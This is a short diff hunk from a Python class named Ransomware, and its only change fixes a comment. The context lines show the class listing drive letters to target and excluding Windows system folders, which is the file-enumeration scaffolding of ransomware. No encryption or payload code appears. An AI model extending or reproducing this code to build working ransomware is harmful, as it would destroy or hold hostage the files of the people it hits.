@@ -14,7 +14,7 @@ class Ransomware(object):
                         'J:','K:','L:','M:','N:','O:','P:','Q:',
                             'R:','S:','T:','U:','V:','W:','X:','Y:','Z:')
         self.EXCLUDE_DIRECTORY = (
-                            #Windows system directory
+                            #Windows system directorys
                             'Program Files',
                             'Program Files (x86)',
                             'Windows',
